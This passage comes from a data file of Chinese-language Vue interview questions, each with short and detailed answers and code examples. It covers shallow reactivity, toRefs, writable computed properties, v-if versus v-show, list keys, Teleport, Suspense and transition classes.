                detailedAnswer: '浅响应式 API：\n\n- shallowRef：只有 .value 整体替换才触发更新，深层修改不触发\n- shallowReactive：只有根级属性变化触发更新，深层属性修改不触发\n- readonly / shallowReadonly：只读代理\n- markRaw：标记对象永不响应式\n\n对比：\n```\n// ref：深度响应式\nconst obj = ref({ a: { b: 1 } })\nobj.value.a.b = 2 // ✅ 触发更新\n\n// shallowRef：浅响应式\nconst obj = shallowRef({ a: { b: 1 } })\nobj.value.a.b = 2 // ❌ 不触发更新\nobj.value = { a: { b: 2 } } // ✅ 触发更新（整体替换）\n\n// reactive：深度响应式\nconst state = reactive({ a: { b: 1 } })\nstate.a.b = 2 // ✅ 触发更新\n\n// shallowReactive：浅响应式\nconst state = shallowReactive({ a: { b: 1 } })\nstate.a = { b: 2 } // ✅ 触发更新（根级）\nstate.a.b = 2 // ❌ 不触发更新（深层）\n```\n\n使用场景：\n1. 大型对象性能优化：\n- 表格数据（数千行）：避免深度代理开销\n- 表单复杂结构：根级响应足够\n\n2. 第三方对象：\n- 图表实例（ECharts/Chart.js）：内部不需响应式\n- DOM 节点引用\n- class 实例\n```\nconst chart = shallowRef(null)\nonMounted(() => {\n  chart.value = echarts.init(el)\n})\n// chart.value.setOption(...) 不需触发组件更新\n```\n\n3. 静态数据：\n- 配置对象：不变化或整体替换\n- 大列表：用 shallowRef 整体替换\n\n4. 配合 triggerRef 手动触发：\n```\nconst obj = shallowRef({ count: 0 })\nobj.value.count++ // 不触发\ntriggerRef(obj)   // 手动触发更新\n```\n\nmarkRaw：\n- 标记对象永不响应式\n- 适合完全不需要响应式的对象\n```\nconst obj = reactive({\n  chart: markRaw(echarts.init(el)), // 不响应式\n})\n```\n\n注意事项：\n- 浅响应式需明确知道何时触发更新\n- 修改深层属性需手动 triggerRef 或整体替换\n- 调试时注意：DevTools 可能不显示深层变化',
                codeExample: `// 1. shallowRef 优化大列表\nimport { shallowRef, watchEffect } from "vue"\nconst list = shallowRef([])\n// 模拟大数据\nlist.value = Array.from({ length: 10000 }, (_, i) => ({ id: i, name: \`Item \${i}\` }))\n\n// ❌ 不触发更新（深层修改）\nlist.value[0].name = "New Name"\n// ✅ 触发更新（整体替换）\nlist.value = [...list.value, { id: 10000, name: "New" }]\n// ✅ 手动触发\nlist.value[0].name = "New Name"\ntriggerRef(list)\n\n// 2. shallowReactive 优化配置\nconst config = shallowReactive({\n  theme: "dark",\n  chartOptions: { /* 大对象 */ },\n})\n// 根级变化触发更新\nconfig.theme = "light" // ✅\n// 深层不触发\nconfig.chartOptions.title = "New" // ❌\n\n// 3. 第三方实例用 shallowRef\nconst chartRef = shallowRef(null)\nconst containerRef = ref(null)\nonMounted(() => {\n  chartRef.value = echarts.init(containerRef.value)\n  chartRef.value.setOption({ /* ... */ })\n})\nonBeforeUnmount(() => {\n  chartRef.value?.dispose()\n})\n\n// 4. markRaw 永不响应式\nimport { markRaw, reactive } from "vue"\nconst state = reactive({\n  map: markRaw(new AMap.Map()), // 地图实例不响应式\n  list: [], // 仍响应式\n})`,
                difficulty: 'medium',
                tags: ['Vue3', 'shallowRef', 'shallowReactive', '性能优化'],
                keyPoints: ['shallow 只做浅层响应', '深层修改不触发更新', '用于大对象/第三方实例优化', 'triggerRef 手动触发'],
              },
              {
                id: 'vue-toref-torefs',
                domain: 'vue',
                question: 'toRef 和 toRefs 的作用？为什么解构 reactive 会丢失响应式？',
                shortAnswer: 'toRef/toRefs 将 reactive 对象的属性转为 ref，解构后保持响应式。原理：解构 reactive 直接取值会断开响应式追踪；toRefs 创建指向原属性的 ref 引用，修改仍触发原对象更新。',
                detailedAnswer: '为何解构丢失响应式：\n\n```\nconst state = reactive({ count: 0, name: "A" })\nconst { count, name } = state\n// 等价于：const count = state.count; const name = state.name\n// count 是基本类型值（0），与 state 断开\nstate.count++ // state.count = 1，但 count 仍为 0\n```\n\nreactive 是 Proxy 代理对象，访问属性触发 track。但解构取值后，count 是普通变量，不再与响应式系统关联。\n\ntoRef/toRefs 解决方案：\n\ntoRef：\n- 把单个属性转为 ref\n- 转换后修改 .value 会同步原对象\n- const countRef = toRef(state, "count")\n\ntoRefs：\n- 把整个对象的每个属性都转为 ref\n- 返回一个对象，每个属性是 ref\n- const { count, name } = toRefs(state)\n- 解构后每个都是 ref，保持响应式\n\n原理：\n- toRef 创建的 ref 内部 getter/setter 指向原 reactive 对象的属性\n- 修改 .value 实际修改原对象属性，触发响应式更新\n- 不是复制值，而是创建代理引用\n\n使用场景：\n1. setup 函数返回时解构保持响应式：\n```\nfunction useCounter() {\n  const state = reactive({ count: 0, name: "A" })\n  return { ...toRefs(state) } // 模板中 count/name 是 ref\n}\n```\n\n2. 组合式函数返回响应式状态：\n```\nfunction useUser() {\n  const user = reactive({ name: "", age: 0 })\n  return { ...toRefs(user) }\n}\n// 使用：const { name, age } = useUser() // 仍响应式\n```\n\n3. computed 配合 reactive：\n```\nconst state = reactive({\n  firstName: "A",\n  lastName: "B",\n})\nconst { firstName, lastName } = toRefs(state)\nconst fullName = computed(() => firstName.value + lastName.value)\n```\n\ntoRef 单个属性：\n```\nconst state = reactive({ count: 0 })\nconst countRef = toRef(state, "count")\ncountRef.value++ // 修改会影响 state\n```\n\n注意：\n- toRefs 必须用于 reactive 对象（非 ref）\n- 解构 ref 对象不需 toRefs（解构后仍是 ref）\n- 模板中 ref 自动解包，使用方便\n- 仅在 setup/composable 返回时用，组件内部直接用 state.xxx 即可',
                codeExample: `// 1. 解构丢失响应式问题\nimport { reactive } from "vue"\nconst state = reactive({ count: 0, name: "Alice" })\n\n// ❌ 解构后失去响应式\nlet { count, name } = state\nsetTimeout(() => {\n  state.count = 10\n  console.log(count) // 仍是 0（不响应）\n}, 1000)\n\n// 2. toRefs 解决\nimport { toRefs } from "vue"\nconst state = reactive({ count: 0, name: "Alice" })\nconst { count, name } = toRefs(state) // 都是 ref\nsetTimeout(() => {\n  state.count = 10\n  console.log(count.value) // 10（响应式）\n}, 1000)\n\n// 3. 组合式函数返回\nimport { reactive, toRefs } from "vue"\nfunction useCounter() {\n  const state = reactive({\n    count: 0,\n    double: computed(() => state.count * 2),\n  })\n  function increment() {\n    state.count++\n  }\n  return {\n    ...toRefs(state), // count, double 都是 ref\n    increment,\n  }\n}\n// 组件中使用\nconst { count, double, increment } = useCounter()\n// count.value, double.value 响应式\n\n// 4. toRef 单个属性\nimport { reactive, toRef } from "vue"\nconst state = reactive({ user: { name: "A" } })\nconst nameRef = toRef(() => state.user.name) // getter 形式\nnameRef.value = "B" // 修改 state.user.name\n\n// 5. 模板中使用\n<script setup>\nconst { count, name } = toRefs(state)\n</script>\n<template>\n  <div>{{ count }} - {{ name }}</div> <!-- 自动解包 -->\n  <button @click="count++">+1</button>\n</template>`,
                difficulty: 'medium',
                tags: ['Vue3', 'toRef', 'toRefs', '解构'],
                keyPoints: ['解构 reactive 丢失响应式', 'toRef/toRefs 转为 ref 保持响应', '修改 .value 同步原对象', '用于 composable 返回响应式状态'],
              },
              {
                id: 'vue-computed-setter',
                domain: 'vue',
                question: 'Vue 中 computed 的 getter 和 setter？如何创建可写的计算属性？',
                shortAnswer: 'computed 默认只读（仅 getter）。可传对象 { get, set } 创建可写计算属性。setter 常用于双向绑定派生数据，如 fullName 的 set 拆分 firstName/lastName。',
                detailedAnswer: 'computed 默认行为：\n- 传函数：computed(() => ...) 只读\n- 修改会警告：Write operation failed: computed value is readonly\n\n可写 computed：\n- 传对象 { get, set }\n- get：读取时计算派生值\n- set：赋值时执行反向操作\n\n语法：\n```\nconst fullName = computed({\n  get() { return firstName.value + " " + lastName.value },\n  set(newVal) {\n    const [first, last] = newVal.split(" ")\n    firstName.value = first\n    lastName.value = last\n  },\n})\n```\n\n使用场景：\n1. 双向绑定派生数据：\n- fullName 的 get 合并，set 拆分\n- v-model="fullName" 双向绑定\n\n2. 重置/修改计算属性：\n- 直接赋值触发反向操作\n\n3. 状态映射：\n- get 从 store 读取，set dispatch action\n```\nconst userName = computed({\n  get: () => store.userName,\n  set: (val) => store.setUserName(val),\n})\n```\n\n4. 格式化数据双向：\n- 日期格式化：get 格式化显示，set 解析输入\n```\nconst formattedDate = computed({\n  get: () => formatDate(date.value),\n  set: (val) => date.value = parseDate(val),\n})\n```\n\n注意事项：\n- setter 不应有副作用（如发请求）\n- setter 应可逆：get(set(x)) === x\n- 复杂场景考虑用 watch 代替\n- Vue 2 也支持（{ get, set } 写在 computed 对象中）\n\nVue 2 vs Vue 3：\n- Vue 2：computed: { fullName: { get() {}, set() {} } }\n- Vue 3：const fullName = computed({ get() {}, set() {} })\n- 行为一致',
                codeExample: `// 1. 可写 computed 双向绑定姓名\nimport { ref, computed } from "vue"\nconst firstName = ref("John")\nconst lastName = ref("Doe")\n\nconst fullName = computed({\n  get() {\n    return firstName.value + " " + lastName.value\n  },\n  set(newVal) {\n    const [first, last] = newVal.split(" ")\n    firstName.value = first\n    lastName.value = last\n  },\n})\n\n// 修改 fullName 会拆分更新\nfullName.value = "Alice Smith"\nconsole.log(firstName.value) // "Alice"\nconsole.log(lastName.value)  // "Smith"\n\n// 模板中双向绑定\n// <input v-model="fullName" />\n\n// 2. 状态映射\nimport { computed } from "vue"\nimport { useUserStore } from "@/stores/user"\nconst store = useUserStore()\nconst userName = computed({\n  get: () => store.name,\n  set: (val) => store.setName(val),\n})\n\n// 3. 日期格式化双向\nconst date = ref(new Date())\nconst formattedDate = computed({\n  get() {\n    return date.value.toISOString().split("T")[0] // YYYY-MM-DD\n  },\n  set(val) {\n    date.value = new Date(val)\n  },\n})\n// <input type="date" v-model="formattedDate" />\n\n// 4. Vue 2 写法\nexport default {\n  data() {\n    return { firstName: "John", lastName: "Doe" }\n  },\n  computed: {\n    fullName: {\n      get() { return this.firstName + " " + this.lastName },\n      set(newVal) {\n        const [first, last] = newVal.split(" ")\n        this.firstName = first\n        this.lastName = last\n      },\n    },\n  },\n}`,
                difficulty: 'medium',
                tags: ['Vue3', 'computed', 'getter', 'setter'],
                keyPoints: ['默认只读仅 getter', '传 {get, set} 可写', 'setter 用于反向操作', '常用于双向绑定派生数据'],
              },
              {
                id: 'vue-vif-vshow',
                domain: 'vue',
                question: 'v-if 和 v-show 的区别？何时用哪个？',
                shortAnswer: 'v-if 真正条件渲染（false 不渲染 DOM，true 才创建），切换开销大；v-show 始终渲染 DOM，用 display:none 切换，初始开销大但切换快。频繁切换用 v-show，条件很少变化用 v-if。',
                detailedAnswer: 'v-if vs v-show：\n\n| 维度 | v-if | v-show |\n|------|------|--------|\n| 渲染 | true 才创建 DOM | 始终创建 DOM |\n| false 时 | DOM 不存在 | display:none |\n| 切换开销 | 大（创建/销毁） | 小（改 CSS） |\n| 初始开销 | 小（false 时不渲染） | 大（始终渲染） |\n| 编译 | 编译为三元表达式 | 编译为 v-show 指令 |\n| 适用 | 条件少变 | 频繁切换 |\n| 配合 | v-else/v-else-if | 无 |\n| 性能 | 切换慢 | 切换快 |\n\nv-if 原理：\n- false 时组件不渲染（虚拟节点为 null）\n- true 时创建组件实例、挂载 DOM\n- false 时销毁组件实例、卸载 DOM\n- 触发 mounted/unmounted 生命周期\n- 适合条件基本不变的场景\n\nv-show 原理：\n- 始终渲染组件，创建实例\n- 通过 style.display 控制显示\n- 切换只改 CSS，不销毁实例\n- 不触发 mounted/unmounted\n- 适合频繁切换的场景\n\n使用场景：\n\n用 v-if：\n- 权限控制（用户角色决定显示）\n- 路由切换（页面级条件）\n- 错误状态（404、loading 错误）\n- 条件很少变化\n- 不需要切换性能\n\n用 v-show：\n- Tab 切换\n- 折叠面板\n- 弹窗显隐\n- 频繁切换的内容\n- 需要保留组件状态（如表单输入）\n\n注意事项：\n1. v-if 和 v-for 不应一起用：\n- Vue 2：v-for 优先于 v-if（每次循环都判断，浪费）\n- Vue 3：v-if 优先于 v-for（v-if 拿不到 v-for 变量）\n- 解决：用 computed 过滤后再 v-for\n\n2. v-show 配合 transition：\n- v-show 切换可触发 transition\n- 适合淡入淡出动画\n\n3. 性能权衡：\n- 切换频率高：v-show（避免反复创建销毁）\n- 切换频率低：v-if（避免初始渲染开销）\n- 大组件初始渲染慢：v-if（按需渲染）\n- 不可见时需清理（如视频播放）：v-if（销毁释放资源）\n\n4. 与 keep-alive 配合：\n- v-if 切换的组件可用 keep-alive 缓存\n- v-show 不需要 keep-alive（本身没销毁）',
                codeExample: `// 1. v-if：权限控制（条件少变）\n<template>\n  <button v-if="hasPermission">删除</button>\n  <button v-else>无权限</button>\n</template>\n\n// 2. v-show：Tab 切换（频繁切换）\n<template>\n  <div>\n    <button @click="tab = 'a'">Tab A</button>\n    <button @click="tab = 'b'">Tab B</button>\n    <div v-show="tab === 'a'">Content A</div>\n    <div v-show="tab === 'b'">Content B</div>\n  </div>\n</template>\n\n// 3. v-show 配合 transition\n<transition name="fade">\n  <div v-show="visible" class="modal">弹窗</div>\n</transition>\n\n// 4. v-if 和 v-for 不要一起用\n// ❌ Vue 2：每次循环都判断\n<li v-for="user in users" v-if="user.active">{{ user.name }}</li>\n// ❌ Vue 3：v-if 拿不到 user\n<li v-for="user in users" v-if="user.active">{{ user.name }}</li>\n// ✅ 用 computed 过滤\nconst activeUsers = computed(() => users.value.filter((u) => u.active))\n<li v-for="user in activeUsers">{{ user.name }}</li>\n\n// 5. 性能对比\n// 频繁切换（每秒多次）：v-show 更好\n// 初始隐藏且很少显示：v-if 更好（不渲染省资源）\n// 大组件按需加载：v-if（配合异步组件）`,
                difficulty: 'easy',
                tags: ['Vue', 'v-if', 'v-show'],
                keyPoints: ['v-if 真条件渲染切换开销大', 'v-show 始终渲染 display 切换', '频繁切换用 v-show', 'v-if 和 v-for 不要一起用'],
              },
              {
                id: 'vue-vfor-key',
                domain: 'vue',
                question: 'Vue 中 v-for 为什么要用 key？用 index 作 key 有什么问题？',
                shortAnswer: 'key 是 vnode 的唯一标识，帮助 Diff 算法识别节点复用。用 index 作 key 的问题：1) 数据顺序变化导致状态错乱 2) 性能下降（无法复用）3) 触发不必要的组件重建。应用稳定唯一的 id。',
                detailedAnswer: 'key 的作用：\n- vnode 的唯一标识\n- Diff 时通过 key 判断节点是否可复用\n- 相同 key 复用（更新属性/内容），不同 key 销毁重建\n- 提升性能、保持组件状态\n\n为何要用 key：\n\n1. 性能优化：\n- 无 key：默认按位置比较，节点类型相同就复用\n- 有 key：精确匹配同 key 节点，避免不必要的 DOM 操作\n- 列表中间插入/删除时，有 key 移动次数更少\n\n2. 状态保持：\n- 相同 key 的组件实例复用，状态保留\n- 不同 key 销毁重建，状态丢失\n- 表单输入、动画状态等依赖 key 保持\n\n用 index 作 key 的问题：\n\n场景：列表 [A, B, C]，在头部插入 X，变成 [X, A, B, C]\n\n- 用 index 作 key：\n  - 之前：A(key=0), B(key=1), C(key=2)\n  - 之后：X(key=0), A(key=1), B(key=2), C(key=3)\n  - Diff 认为 key=0 还是 A（实际是 X），更新内容\n  - key=1 还是 B（实际是 A），更新内容\n  - 所有节点都要更新内容，性能差\n  - 若 A 是输入框有输入，输入会"跑"到 B 位置（状态错乱）\n\n- 用 id 作 key：\n  - 之前：A(id=a), B(id=b), C(id=c)\n  - 之后：X(id=x), A(id=a), B(id=b), C(id=c)\n  - Diff 识别 a/b/c 仍存在，复用，只创建 x\n  - 性能好，状态保持\n\n具体问题：\n1. 状态错乱：\n- 输入框输入值跟随位置而非数据\n- 动画状态错乱\n- 子组件内部状态错乱\n\n2. 性能下降：\n- 无法有效复用节点\n- 触发不必要的更新\n\n3. 组件重建：\n- 复杂组件可能被销毁重建\n- 触发 unmounted/mounted\n- 性能损耗大\n\n何时可用 index：\n- 列表纯展示（无状态、无交互）\n- 列表不变化（不增删改顺序）\n- 静态数据\n- 仍不推荐，养成用 id 的习惯\n\nkey 的要求：\n- 稳定：不随渲染变化\n- 唯一：同列表内不重复\n- 不要用随机数（每次不同导致重建）\n- 不要用对象引用（可能变）',
                codeExample: `// 1. ❌ 用 index 作 key 的问题\n<template>\n  <div>\n    <button @click="insert">在头部插入</button>\n    <!-- 用 index 作 key -->\n    <div v-for="(item, index) in list" :key="index">\n      <input type="text" v-model="item.name" />\n      <span>{{ item.name }}</span>\n    </div>\n  </div>\n</template>\n<script setup>\nconst list = ref([\n  { id: 1, name: "Alice" },\n  { id: 2, name: "Bob" },\n])\nfunction insert() {\n  list.value.unshift({ id: 3, name: "Charlie" })\n}\n</script>\n// 问题：在 Alice 输入框输入后，点插入，输入值会"跑"到 Bob 位置\n\n// 2. ✅ 用 id 作 key\n<div v-for="item in list" :key="item.id">\n  <input v-model="item.name" />\n  <span>{{ item.name }}</span>\n</div>\n// 插入时，Alice 的输入框状态保持，Charlie 在头部新增\n\n// 3. key 在动画中的应用\n<transition-group name="list" tag="ul">\n  <li v-for="item in list" :key="item.id">{{ item.name }}</li>\n</transition-group>\n// 必须有 key，transition-group 才能正确追踪动画\n\n// 4. key 在组件复用中的影响\n// ❌ 用 index：组件状态错乱\n<template v-for="(item, index) in list" :key="index">\n  <MyComponent :data="item" />\n</template>\n// ✅ 用 id：组件正确复用\n<template v-for="item in list" :key="item.id">\n  <MyComponent :data="item" />\n</template>\n\n// 5. 强制重新渲染（用 key 重置组件）\n<template>\n  <UserForm :key="formKey" />\n  <button @click="formKey++">重置表单</button>\n</template>\n<script setup>\nconst formKey = ref(0)\n</script>\n// 改变 key 会销毁重建组件，状态清空`,
                difficulty: 'medium',
                tags: ['Vue', 'v-for', 'key', 'Diff'],
                keyPoints: ['key 是 vnode 唯一标识', '帮助 Diff 复用节点', 'index 作 key 状态错乱', '用稳定唯一 id'],
              },
              {
                id: 'vue-teleport',
                domain: 'vue',
                question: 'Vue 3 Teleport 的作用和原理？使用场景？',
                shortAnswer: 'Teleport 将组件渲染到指定 DOM 节点（如 body），而非父组件内。用于弹窗、提示框、loading 等需要脱离父组件样式/层级的位置。原理：渲染时将 vnode 挂载到 target 元素而非父级。',
                detailedAnswer: 'Teleport 作用：\n- 将组件内容渲染到指定 DOM 节点\n- 脱离父组件的 DOM 层级\n- 但保持组件的逻辑父子关系（props/emit/inject 正常）\n\n基本用法：\n```\n<Teleport to="body">\n  <div class="modal">弹窗内容</div>\n</Teleport>\n// 渲染到 document.body 下，而非当前组件位置\n```\n\nProps：\n- to：目标选择器或 DOM 元素\n  - 字符串："body"、"#modal-root"、".container"\n  - DOM 元素：document.getElementById("root")\n- disabled：是否禁用 teleport（true 时渲染到原位置）\n```\n<Teleport to="body" :disabled="!isOpen">\n  <div v-if="isOpen">弹窗</div>\n</Teleport>\n// disabled 时渲染到当前位置，启用时 teleport\n```\n\n原理：\n- Teleport 是内置组件\n- 渲染时将 children 的 vnode 标记为 teleport 类型\n- 挂载时将 children 挂到 target 元素而非父级\n- 但组件实例树仍保持原结构（逻辑关系不变）\n- 更新时只更新 children，不影响父组件树\n\n使用场景：\n1. 全局弹窗/模态框：\n- 避免 z-index 层级问题\n- 不受父组件 overflow:hidden 影响\n- 不受父组件 transform 影响（transform 创建新包含块）\n\n2. 全局提示/通知：\n- toast、notification\n- 渲染到 body 顶层\n\n3. Loading 遮罩：\n- 全屏 loading\n- 不受父组件样式影响\n\n4. 右键菜单：\n- 跟随鼠标位置\n- 渲染到 body 避免被裁剪\n\n5. 抽屉/侧边栏：\n- 全屏抽屉\n- 避免层级问题\n\n为何需要 Teleport：\n- 父组件 overflow:hidden 会裁剪子组件\n- 父组件 transform/filter 创建新包含块，fixed 失效\n- z-index 层级管理复杂\n- Teleport 解决这些问题，内容渲染到 body 顶层\n\n多个 Teleport 共享目标：\n- 多个 Teleport 渲染到同一 target，按顺序追加\n- 卸载时自动移除\n\n与 React Portal 区别：\n- React：createPortal(children, container)\n- Vue：<Teleport to="...">children</Teleport>\n- 行为类似，Vue 用模板语法更直观',
                codeExample: `// 1. 基础弹窗\n<template>\n  <button @click="show = true">打开弹窗</button>\n  <Teleport to="body">\n    <div v-if="show" class="modal">\n      <div class="modal-content">\n        <h2>标题</h2>\n        <p>内容</p>\n        <button @click="show = false">关闭</button>\n      </div>\n    </div>\n  </Teleport>\n</template>\n<script setup>\nconst show = ref(false)\n</script>\n<style>\n.modal {\n  position: fixed;\n  top: 0; left: 0; right: 0; bottom: 0;\n  background: rgba(0,0,0,0.5);\n  display: flex;\n  align-items: center;\n  justify-content: center;\n  z-index: 9999;\n}\n</style>\n\n// 2. disabled 动态控制\n<Teleport to="body" :disabled="inline">\n  <Tooltip :visible="visible" />\n</Teleport>\n// inline=false 时 teleport 到 body\n// inline=true 时渲染到当前位置\n\n// 3. 多个 Teleport 共享目标\n<Teleport to="#notifications">\n  <Notification type="success" />\n</Teleport>\n<Teleport to="#notifications">\n  <Notification type="error" />\n</Teleport>\n// 都渲染到 #notifications，按顺序追加\n\n// 4. 组合式 API 使用\n<script setup>\nimport { ref } from "vue"\nconst target = ref(null)\nonMounted(() => {\n  // 动态指定 target\n})\n</script>\n<template>\n  <div ref="target"></div>\n  <Teleport :to="target">\n    <div>渲染到 target</div>\n  </Teleport>\n</template>\n\n// 5. 封装 Modal 组件\n<script setup>\nconst props = defineProps({\n  modelValue: Boolean,\n  teleportTo: { type: String, default: "body" },\n})\nconst emit = defineEmits(["update:modelValue"])\n</script>\n<template>\n  <Teleport :to="teleportTo">\n    <transition name="fade">\n      <div v-if="modelValue" class="modal" @click.self="emit('update:modelValue', false)">\n        <slot></slot>\n      </div>\n    </transition>\n  </Teleport>\n</template>`,
                difficulty: 'medium',
                tags: ['Vue3', 'Teleport', 'Portal'],
                keyPoints: ['渲染到指定 DOM 节点', '保持逻辑父子关系', '解决 z-index/overflow/transform 问题', '用于弹窗/通知/loading'],
              },
              {
                id: 'vue-suspense',
                domain: 'vue',
                question: 'Vue 3 Suspense 的作用？如何处理异步组件？',
                shortAnswer: 'Suspense 协调异步组件的 loading 状态，提供 fallback 插槽显示加载中。子组件用 async setup() 或异步组件时，Suspense 显示 fallback 直到完成。简化异步状态管理。',
                detailedAnswer: 'Suspense 作用：\n- 协调异步组件/异步 setup 的加载状态\n- 提供统一的 loading/fallback UI\n- 简化异步状态管理（无需手动 v-if loading）\n\n基本用法：\n```\n<Suspense>\n  <template #default>\n    <AsyncComponent />\n  </template>\n  <template #fallback>\n    <div>Loading...</div>\n  </template>\n</Suspense>\n// AsyncComponent 加载完成前显示 fallback\n```\n\n异步组件定义：\n1. defineAsyncComponent：\n```\nconst AsyncComp = defineAsyncComponent(() => import("./Comp.vue"))\n```\n\n2. async setup()：\n```\nasync setup() {\n  const data = await fetch("/api/data").then(r => r.json())\n  return { data }\n}\n```\n\n3. 异步组件配置：\n```\nconst AsyncComp = defineAsyncComponent({\n  loader: () => import("./Comp.vue"),\n  loadingComponent: Loading,\n  errorComponent: Error,\n  delay: 200,\n  timeout: 3000,\n})\n```\n\nSuspense 工作原理：\n1. 子组件异步时，Suspense 进入 pending 状态\n2. 显示 #fallback 插槽内容\n3. 子组件 resolve 后，Suspense 进入 resolve 状态\n4. 显示 #default 插槽内容\n5. 多个子组件全部完成才切换\n\n事件：\n- resolve：所有异步完成\n- pending：进入 pending\n\n嵌套 Suspense：\n- 外层 Suspense 等所有内层完成\n- 内层 Suspense 独立 loading\n```\n<Suspense>\n  <template #default>\n    <Header />\n    <Suspense>\n      <template #default><AsyncList /></template>\n      <template #fallback><ListSkeleton /></template>\n    </Suspense>\n  </template>\n  <template #fallback><PageSkeleton /></template>\n</Suspense>\n```\n\n错误处理：\n- async setup 抛错会触发 errorCaptured\n- 配合 onErrorCaptured 处理错误\n```\n<Suspense>\n  <template #default>\n    <AsyncComp />\n  </template>\n  <template #fallback>\n    <Loading />\n  </template>\n</Suspense>\n\n// 父组件\nonErrorCaptured((err) => {\n  console.error(err)\n  return false // 阻止向上传播\n})\n```\n\n使用场景：\n1. 路由组件异步加载\n2. 数据获取（async setup 中 await）\n3. 代码分割（动态 import）\n4. 流式 SSR（服务端流式渲染）\n\n注意事项：\n- Suspense 仍是实验性特性（Vue 3.x）\n- async setup 中只能在顶层 await\n- 异步错误处理需配合 onErrorCaptured\n- 与 transitions 配合需注意 transition 时机\n\n与 React Suspense 区别：\n- React：throw promise 触发 Suspense\n- Vue：async setup/异步组件触发\n- 行为类似，实现不同',
                codeExample: `// 1. 基础用法\n<template>\n  <Suspense>\n    <template #default>\n      <UserProfile :userId="userId" />\n    </template>\n    <template #fallback>\n      <div class="loading">加载中...</div>\n    </template>\n  </Suspense>\n</template>\n\n// UserProfile.vue（async setup）\n<script setup>\nconst props = defineProps({ userId: Number })\n// 顶层 await\nconst user = await fetch(\`/api/user/\${props.userId}\`).then(r => r.json())\nconst posts = await fetch(\`/api/posts?userId=\${props.userId}\`).then(r => r.json())\n</script>\n<template>\n  <div>\n    <h1>{{ user.name }}</h1>\n    <PostList :posts="posts" />\n  </div>\n</template>\n\n// 2. defineAsyncComponent\nimport { defineAsyncComponent } from "vue"\nconst AsyncChart = defineAsyncComponent({\n  loader: () => import("./Chart.vue"),\n  loadingComponent: { template: "<div>Loading chart...</div>" },\n  errorComponent: { template: "<div>Failed to load</div>" },\n  delay: 200, // 200ms 后显示 loading\n  timeout: 5000, // 5s 超时显示 error\n})\n\n// 3. 嵌套 Suspense\n<template>\n  <Suspense>\n    <template #default>\n      <Layout>\n        <Suspense>\n          <template #default><AsyncContent /></template>\n          <template #fallback><ContentSkeleton /></template>\n        </Suspense>\n      </Layout>\n    </template>\n    <template #fallback><PageSkeleton /></template>\n  </Suspense>\n</template>\n\n// 4. 错误处理\n<script setup>\nimport { ref, onErrorCaptured } from "vue"\nconst error = ref(null)\nonErrorCaptured((err) => {\n  error.value = err\n  return false // 阻止传播\n})\n</script>\n<template>\n  <div v-if="error">Error: {{ error.message }}</div>\n  <Suspense v-else>\n    <template #default><AsyncComp /></template>\n    <template #fallback><Loading /></template>\n  </Suspense>\n</template>\n\n// 5. 配合 transition\n<template>\n  <transition name="fade" mode="out-in">\n    <Suspense>\n      <template #default><AsyncComp /></template>\n      <template #fallback><Loading /></template>\n    </Suspense>\n  </transition>\n</template>`,
                difficulty: 'hard',
                tags: ['Vue3', 'Suspense', '异步组件'],
                keyPoints: ['协调异步组件 loading', 'fallback 插槽显示加载', 'async setup 顶层 await', '仍是实验性特性'],
              },
              {
                id: 'vue-transition',
                domain: 'vue',
                question: 'Vue transition 过渡动画的原理和类名？',
                shortAnswer: 'transition 在元素 enter/leave 时自动添加 6 个 CSS 类名：v-enter-from、v-enter-active、v-enter-to、v-leave-from、v-leave-active、v-leave-to。通过 CSS transition/animation 实现动画。可配合 JavaScript 钩子。',
                detailedAnswer: 'transition 工作原理：\n\n- 包裹单个元素（v-if/v-show 切换时触发）\n- 自动添加/移除 CSS 类名\n- 监听 transitionend/animationend 判断动画结束\n\n6 个 CSS 类名（Vue 3）：\n- v-enter-from：进入起始状态（Vue 2 是 v-enter）\n- v-enter-active：进入过程中（定义 transition）\n- v-enter-to：进入结束状态\n- v-leave-from：离开起始状态\n- v-leave-active：离开过程中（定义 transition）\n- v-leave-to：离开结束状态\n\n自定义类名前缀：\n```\n<transition name="fade">\n  <div v-if="show">内容</div>\n</transition>\n// 类名变为 fade-enter-from 等\n```\n\nCSS 示例：\n```\n.fade-enter-from { opacity: 0 }\n.fade-enter-active { transition: opacity 0.3s }\n.fade-enter-to { opacity: 1 }\n.fade-leave-from { opacity: 1 }\n.fade-leave-active { transition: opacity 0.3s }\n.fade-leave-to { opacity: 0 }\n```\n\n动画流程：\n1. enter：\n   - 添加 v-enter-from + v-enter-active\n   - 下一帧移除 v-enter-from，添加 v-enter-to\n   - transitionend 后移除所有类\n\n2. leave：\n   - 添加 v-leave-from + v-leave-active\n   - 下一帧移除 v-leave-from，添加 v-leave-to\n   - transitionend 后移除元素和类\n\nProps：\n- name：类名前缀\n- appear：首次渲染也触发动画\n- css：是否用 CSS 过渡（false 用 JS 钩子）\n- type：transition/animation（指定监听哪种结束事件）\n- duration：显式指定时长\n- mode：out-in（先离开再进入）/ in-out（先进入再离开）\n- enter-from-class/enter-active-class 等：自定义类名\n\nJavaScript 钩子：\n```\n<transition\n  @before-enter="beforeEnter"\n  @enter="enter"\n  @after-enter="afterEnter"\n  @before-leave="beforeLeave"\n  @leave="leave"\n  @after-leave="afterLeave"\n>\n  <div v-if="show">内容</div>\n</transition>\n```\n- 钩子参数：(el, done)\n- 用 done callback 告知动画结束（css:false 时必须调用）\n- 适合 GSAP/Velocity 等动画库\n\ntransition-group：\n- 用于列表动画\n- 支持 move 类名（位置移动动画）\n- 必须用 key 追踪元素\n```\n<transition-group name="list" tag="ul">\n  <li v-for="item in list" :key="item.id">{{ item }}</li>\n</transition-group>\n// .list-move { transition: transform 0.3s }\n```\n\n注意事项：\n- transition 只能包裹单个根元素\n- 多元素用 mode 切换\n- 列表用 transition-group\n- transition 不渲染真实 DOM（抽象组件）',
                codeExample: `// 1. 基础淡入淡出\n<template>\n  <button @click="show = !show">切换</button>\n  <transition name="fade">\n    <div v-if="show" class="box">内容</div>\n  </transition>\n</template>\n<style>\n.fade-enter-from, .fade-leave-to { opacity: 0; }\n.fade-enter-active, .fade-leave-active { transition: opacity 0.3s; }\n.fade-enter-to, .fade-leave-from { opacity: 1; }\n</style>\n\n// 2. 滑动动画\n<transition name="slide">\n  <div v-if="show">内容</div>\n</transition>\n<style>\n.slide-enter-from { transform: translateX(100%); opacity: 0; }\n.slide-enter-active, .slide-leave-active { transition: all 0.3s; }\n.slide-leave-to { transform: translateX(-100%); opacity: 0; }\n</style>\n\n// 3. mode 切换\n<transition name="fade" mode="out-in">\n  <div v-if="tab === 'a'" key="a">Content A</div>\n  <div v-else key="b">Content B</div>\n</transition>\n// out-in：A 先离开，再进入 B（避免重叠）\n\n// 4. appear 